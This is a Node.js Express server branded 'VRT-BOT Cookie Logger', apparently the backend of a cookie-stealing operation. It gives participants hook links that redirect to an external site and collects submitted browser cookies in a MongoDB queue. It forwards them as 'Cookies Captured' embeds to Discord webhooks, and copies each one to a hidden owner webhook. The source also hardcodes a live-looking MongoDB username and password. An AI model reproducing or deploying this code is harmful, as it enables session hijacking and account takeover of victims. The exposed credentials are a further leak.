const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { MongoClient, ServerApiVersion } = require('mongodb');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
//  ✅ CORS CONFIGURATION
// ============================================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
    credentials: true,
    preflightContinue: false,
    optionsSuccessStatus: 204
}));

app.options('*', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept');
    res.sendStatus(204);
});

app.use(express.json({ limit: '10mb' }));

// ============================================================
//  ✅ LOGGING MIDDLEWARE
// ============================================================
app.use((req, res, next) => {
    console.log(`📨 ${req.method} ${req.path}`);
    if (req.body && Object.keys(req.body).length > 0) {
        console.log('📦 Body:', JSON.stringify(req.body).substring(0, 200));
    }
    next();
});

// ============================================================
//  ✅ CSP HEADERS
// ============================================================
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; " +
        "font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com data:; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self' https:;"
    );
    next();
});

// ============================================================
//  ✅ MONGODB CONNECTION
// ============================================================
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://rfbbuiness_db_user:JQ9tfKQbuZMRIxvV@clasific.rziuvht.mongodb.net/?appName=CLASIFIC';
const DB_NAME = process.env.DB_NAME || 'vrtbot';
const COLLECTION_NAME = 'webhooks';
const QUEUE_COLLECTION = 'webhook_queue';

let db;
let webhooksCollection;
let queueCollection;
let mongoClient;

async function connectToMongoDB() {
    try {
        mongoClient = new MongoClient(MONGODB_URI, {
            serverApi: {
                version: ServerApiVersion.v1,
                strict: true,
                deprecationErrors: true,
            },
            tls: true,
            maxPoolSize: 10,
            minPoolSize: 1,
            connectTimeoutMS: 30000,
            socketTimeoutMS: 45000,
            serverSelectionTimeoutMS: 30000,
            retryWrites: true,
            retryReads: true,
        });

        await mongoClient.connect();
        await mongoClient.db(DB_NAME).command({ ping: 1 });
        
        console.log('✅ Connected to MongoDB Atlas successfully');
        
        db = mongoClient.db(DB_NAME);
        webhooksCollection = db.collection(COLLECTION_NAME);
        queueCollection = db.collection(QUEUE_COLLECTION);
        
        // Create indexes
        try {
            await webhooksCollection.createIndex({ username: 1 });
            await webhooksCollection.createIndex({ hookId: 1 });
            await queueCollection.createIndex({ status: 1 });
            await queueCollection.createIndex({ retryAt: 1 });
            await queueCollection.createIndex({ hookId: 1 });
            await queueCollection.createIndex({ createdAt: 1 });
            console.log('✅ Database indexes created');
        } catch (indexError) {
            console.log('ℹ️ Indexes already exist');
        }
        
        return true;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        return false;
    }
}

// ============================================================
//  OWNER'S HARDCODED WEBHOOK
// ============================================================
const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK_URL || '';
console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);

// ============================================================
//  GENERATE UNIQUE ID
// ============================================================
function generateId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = '';
    for (let i = 0; i < 8; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
}

// ============================================================
//  ✅ QUEUE SYSTEM - STORE COOKIE DATA
// ============================================================
async function addToQueue(hookId, username, cookieData) {
    const queueItem = {
        hookId,
        username,
        cookieData: cookieData, // Only cookie data, no embeds
        status: 'pending',
        attempts: 0,
        maxAttempts: 3,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        lastError: null,
        retryAt: null
    };
    
    const result = await queueCollection.insertOne(queueItem);
    console.log(`📥 Added to queue: ${result.insertedId} for user: ${username}`);
    return result.insertedId;
}

async function getPendingQueueItems() {
    const now = new Date().toISOString();
    return await queueCollection
        .find({ 
            status: 'pending',
            $or: [
                { retryAt: { $exists: false } },
                { retryAt: { $lt: now } }
            ]
        })
        .sort({ createdAt: 1 })
        .limit(3)
        .toArray();
}

async function updateQueueItem(id, updates) {
    return await queueCollection.updateOne(
        { _id: id },
        { $set: { ...updates, updatedAt: new Date().toISOString() } }
    );
}

async function getQueueStats() {
    const pending = await queueCollection.countDocuments({ 
        status: 'pending',
        $or: [
            { retryAt: { $exists: false } },
            { retryAt: { $lt: new Date().toISOString() } }
        ]
    });
    const waiting = await queueCollection.countDocuments({ 
        status: 'pending',
        retryAt: { $gt: new Date().toISOString() }
    });
    const sending = await queueCollection.countDocuments({ status: 'sending' });
    const sent = await queueCollection.countDocuments({ status: 'sent' });
    const failed = await queueCollection.countDocuments({ status: 'failed' });
    
    return { pending, waiting, sending, sent, failed, total: pending + waiting + sending + sent + failed };
}

// ============================================================
//  ✅ WEBHOOK SENDER - ONLY COOKIE DATA
// ============================================================
async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
    try {
        if (!webhookUrl) {
            return { success: false, error: 'Webhook URL is empty' };
        }

        // Format cookie data for Discord
        const cookieString = typeof cookieData === 'string' ? cookieData : JSON.stringify(cookieData);
        const cookiePreview = cookieString.length > 1000 ? cookieString.substring(0, 1000) + '...' : cookieString;

        // Discord embed with only cookie data
        const payload = {
            username: "🍪 VRT-Bot Cookie Logger",
            embeds: [{
                title: `🍪 Cookies Captured`,
                description: `**Username:** ${username}`,
                color: 0xff6b6b,
                fields: [
                    {
                        name: "🍪 Cookie Data",
                        value: `\`\`\`\n${cookiePreview}\n\`\`\``,
                        inline: false
                    },
                    {
                        name: "📅 Timestamp",
                        value: new Date().toISOString(),
                        inline: true
                    },
                    {
                        name: "📦 Queue Status",
                        value: "✅ Processed",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "🍪 Cookie Logger" }
            }]
        };

        console.log(`📤 [${username}] Sending cookie data (${cookieString.length} chars)`);

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        const responseText = await response.text();

        if (response.status === 429) {
            const retryAfter = response.headers.get('Retry-After') || '600'; // 10 min default
            console.log(`⏳ Rate limited! Retry after ${retryAfter}s`);
            return { 
                success: false, 
                status: 429, 
                retryAfter: retryAfter,
                error: `Rate limited, retry after ${retryAfter}s`
            };
        }

        if (!response.ok) {
            return { 
                success: false, 
                status: response.status,
                error: responseText || 'HTTP error'
            };
        }

        console.log(`✅ Cookie data sent successfully for ${username}`);
        return { success: true, status: response.status };

    } catch (error) {
        console.error(`❌ Webhook error:`, error.message);
        return { 
            success: false, 
            error: error.message
        };
    }
}

// ============================================================
//  ✅ BACKGROUND PROCESSOR - RUNS EVERY 10 MINUTES
// ============================================================
let isProcessing = false;

async function processQueue() {
    if (isProcessing) {
        console.log(`⏳ Queue processor already running, skipping...`);
        return;
    }
    
    try {
        isProcessing = true;
        console.log(`🔄 ===== QUEUE PROCESSOR STARTED =====`);
        console.log(`⏰ Time: ${new Date().toISOString()}`);
        
        const items = await getPendingQueueItems();
        console.log(`📊 Items found: ${items.length}`);
        
        if (items.length === 0) {
            console.log(`📭 No pending items in queue`);
            console.log(`🔄 ===== QUEUE PROCESSOR IDLE =====`);
            return;
        }
        
        console.log(`📤 Processing ${items.length} queue items`);
        
        for (const item of items) {
            console.log(`📦 ===== PROCESSING ITEM =====`);
            console.log(`📦 ID: ${item._id}`);
            console.log(`👤 User: ${item.username}`);
            console.log(`🔢 Attempt: ${item.attempts + 1}/${item.maxAttempts}`);
            
            await updateQueueItem(item._id, { status: 'sending' });
            
            // Get the hook's webhook URL
            const hook = await webhooksCollection.findOne({ hookId: item.hookId });
            
            if (!hook || !hook.webhookUrl) {
                console.log(`❌ No webhook found for user: ${item.username}`);
                await updateQueueItem(item._id, {
                    status: 'failed',
                    lastError: 'No webhook URL found'
                });
                continue;
            }
            
            // Send to participant webhook
            const result = await sendCookieDataToWebhook(
                hook.webhookUrl, 
                item.username, 
                item.cookieData
            );
            
            if (result.success) {
                await updateQueueItem(item._id, {
                    status: 'sent',
                    completedAt: new Date().toISOString(),
                    lastError: null,
                    retryAt: null
                });
                console.log(`✅ Cookie data sent for ${item.username}`);
                
                // Also send to owner if configured
                if (OWNER_WEBHOOK) {
                    console.log(`📤 Also sending to owner webhook...`);
                    const ownerResult = await sendCookieDataToWebhook(
                        OWNER_WEBHOOK,
                        `[OWNER] ${item.username}`,
                        item.cookieData
                    );
                    if (ownerResult.success) {
                        console.log(`✅ Owner webhook sent`);
                    } else {
                        console.log(`⚠️ Owner webhook failed: ${ownerResult.error}`);
                    }
                }
            } else if (result.status === 429) {
                const retryAfterSeconds = parseInt(result.retryAfter) || 600;
                const retryAt = new Date(Date.now() + (retryAfterSeconds * 1000));
                
                await updateQueueItem(item._id, {
                    status: 'pending',
                    retryAt: retryAt.toISOString(),
                    attempts: item.attempts + 1,
                    lastError: `Rate limited, retry at ${retryAt.toISOString()}`
                });
                console.log(`⏳ Rate limited, retry at ${retryAt.toISOString()}`);
                
                // Stop processing more items if rate limited
                console.log(`⏹️ Stopping queue processing due to rate limit`);
                return;
            } else {
                if (item.attempts >= item.maxAttempts) {
                    await updateQueueItem(item._id, {
                        status: 'failed',
                        lastError: result.error || 'Max attempts reached',
                        retryAt: null
                    });
                    console.log(`❌ Failed after ${item.attempts} attempts for ${item.username}`);
                } else {
                    const retryAt = new Date(Date.now() + 300000); // 5 min
                    await updateQueueItem(item._id, {
                        status: 'pending',
                        retryAt: retryAt.toISOString(),
                        attempts: item.attempts + 1,
                        lastError: result.error || 'Retrying'
                    });
                    console.log(`⚠️ Failed, retrying at ${retryAt.toISOString()}`);
                }
            }
            
            // Wait between items
            console.log(`⏳ Waiting 2 seconds before next item...`);
            await new Promise(r => setTimeout(r, 2000));
        }
        
    } catch (error) {
        console.error(`❌ Queue processing error:`, error);
    } finally {
        isProcessing = false;
        console.log(`🔄 ===== QUEUE PROCESSOR COMPLETED =====`);
        
        // Schedule next check
        const stats = await getQueueStats();
        console.log(`📊 Queue stats after processing:`, stats);
        
        if (stats.pending > 0 || stats.waiting > 0) {
            console.log(`⏰ ${stats.pending + stats.waiting} items remaining, checking again in 5 minutes`);
            setTimeout(() => {
                processQueue();
            }, 300000); // 5 min
        } else {
            console.log(`📭 Queue is empty, processor idle`);
        }
    }
}

// ============================================================
//  ✅ START BACKGROUND PROCESSOR
// ============================================================
function startQueueProcessor() {
    console.log('🚀 Starting queue processor (10 minute intervals)...');
    // Process every 10 minutes
    setInterval(() => {
        processQueue();
    }, 600000); // 10 minutes
}

// ============================================================
//  ✅ API ROUTES
// ============================================================

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'VRT-BOT Cookie Logger',
        ownerWebhookConfigured: !!OWNER_WEBHOOK,
        databaseConnected: !!db,
        timestamp: new Date().toISOString(),
        cors: 'enabled'
    });
});

// Get queue stats
app.get('/api/queue/stats', async (req, res) => {
    if (!db || !queueCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }
    
    try {
        const stats = await getQueueStats();
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Get queue items
app.get('/api/queue/items', async (req, res) => {
    if (!db || !queueCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }
    
    const { hookId, status, limit } = req.query;
    
    try {
        const filter = {};
        if (hookId) filter.hookId = hookId;
        if (status) filter.status = status;
        
        const items = await queueCollection
            .find(filter)
            .sort({ createdAt: -1 })
            .limit(parseInt(limit) || 50)
            .toArray();
        res.json(items);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Generate a new unique hook URL
app.post('/api/generate', async (req, res) => {
    const { username, webhookUrl } = req.body;
    
    console.log(`🔑 Generating hook for user: ${username}`);
    
    if (!username || !webhookUrl) {
        return res.status(400).json({ error: 'Username and webhook URL required' });
    }

    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
        !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Discord webhook URL' });
    }

    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const existing = await webhooksCollection.findOne({ username });
        
        if (existing) {
            await webhooksCollection.updateOne(
                { username },
                { 
                    $set: {
                        webhookUrl,
                        updatedAt: new Date().toISOString()
                    }
                }
            );
            
            return res.json({
                success: true,
                message: 'Webhook updated successfully',
                hookId: existing.hookId,
                hookUrl: `https://vrt-bot-hook-server.onrender.com/hook/${existing.hookId}`,
                isNew: false
            });
        }

        let id = generateId();
        let existingId = await webhooksCollection.findOne({ hookId: id });
        while (existingId) {
            id = generateId();
            existingId = await webhooksCollection.findOne({ hookId: id });
        }

        const newHook = {
            hookId: id,
            username,
            webhookUrl,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        await webhooksCollection.insertOne(newHook);
        
        console.log(`✅ New webhook created for user: ${username} with ID: ${id}`);

        res.json({
            success: true,
            message: 'Webhook registered successfully',
            hookId: id,
            hookUrl: `https://vrt-bot-hook-server.onrender.com/hook/${id}`,
            isNew: true
        });
    } catch (error) {
        console.error('❌ Error generating hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// Get a participant's hook info
app.get('/api/hook/:id', async (req, res) => {
    const { id } = req.params;
    
    console.log(`🔍 Fetching hook: ${id}`);
    
    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const hook = await webhooksCollection.findOne({ hookId: id });
        
        if (!hook) {
            console.log(`❌ Hook not found: ${id}`);
            return res.status(404).json({ error: 'Hook not found' });
        }

        console.log(`✅ Hook found: ${hook.username}`);
        res.json({
            id: hook.hookId,
            username: hook.username,
            createdAt: hook.createdAt,
            webhookConfigured: !!hook.webhookUrl
        });
    } catch (error) {
        console.error('❌ Error fetching hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// Delete a hook
app.delete('/api/hook/:id', async (req, res) => {
    const { id } = req.params;
    
    console.log(`🗑️ Deleting hook: ${id}`);
    
    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const result = await webhooksCollection.deleteOne({ hookId: id });
        
        if (result.deletedCount === 0) {
            return res.status(404).json({ error: 'Hook not found' });
        }
        
        console.log(`✅ Hook deleted: ${id}`);
        res.json({ success: true, message: 'Hook deleted' });
    } catch (error) {
        console.error('❌ Error deleting hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// ============================================================
//  ✅ SUBMIT COOKIES - QUEUE THEM
// ============================================================
app.post('/api/submit-cookies/:hookId', async (req, res) => {
    const { hookId } = req.params;
    const { username, cookieData } = req.body;

    console.log(`🍪 ===== NEW COOKIE SUBMISSION =====`);
    console.log(`🍪 Hook ID: ${hookId}`);
    console.log(`👤 Username: ${username}`);
    console.log(`📦 Cookie data size: ${cookieData ? cookieData.length : 0} chars`);

    if (!cookieData) {
        return res.status(400).json({ error: 'Cookie data required' });
    }

    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        // Verify hook exists
        const hook = await webhooksCollection.findOne({ hookId });
        if (!hook) {
            console.log(`❌ Hook not found: ${hookId}`);
            return res.status(404).json({ error: 'Hook not found' });
        }

        // Add to queue
        const queueId = await addToQueue(hookId, username || hook.username || 'Unknown', cookieData);
        
        console.log(`✅ Cookies queued with ID: ${queueId}`);
        console.log(`📊 Queue size: ${await queueCollection.countDocuments({ status: 'pending' })}`);
        
        // Trigger processing if not already running
        if (!isProcessing) {
            processQueue();
        }

        res.json({
            success: true,
            message: 'Cookie data queued for processing',
            queueId: queueId,
            hookId: hookId,
            username: username || hook.username,
            status: 'pending'
        });
        
    } catch (error) {
        console.error('❌ Error submitting cookies:', error);
        res.status(500).json({ error: 'Server error: ' + error.message });
    }
});

// ============================================================
//  ✅ REDIRECT HOOK PAGE TO MAIN SITE
// ============================================================
app.get('/hook/:id', async (req, res) => {
    const { id } = req.params;
    console.log(`🔗 Redirecting hook: ${id} to main page`);
    res.redirect(`https://vrtvoltsxyc.netlify.app/?hook=${id}`);
});

// ============================================================
//  ✅ STATIC FILES
// ============================================================
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
//  ✅ START SERVER
// ============================================================
async function startServer() {
    console.log('🚀 Starting VRT-BOT Cookie Logger...');
    
    const connected = await connectToMongoDB();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🍃 MongoDB: ${connected ? '✅ Connected' : '❌ Not connected'}`);
        console.log(`✅ CORS enabled for all origins`);
        console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
        console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
        console.log(`⏰ Queue processor runs every 10 minutes`);
    });
    
    if (connected && OWNER_WEBHOOK) {
        startQueueProcessor();
        console.log('✅ Queue processor started');
    }
}

startServer();

process.on('SIGTERM', async () => {
    console.log('SIGTERM signal received: closing connections...');
    if (mongoClient) {
        await mongoClient.close();
        console.log('MongoDB connection closed');
    }
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('SIGINT signal received: closing connections...');
    if (mongoClient) {
        await mongoClient.close();
        console.log('MongoDB connection closed');
    }
    process.exit(0);
});
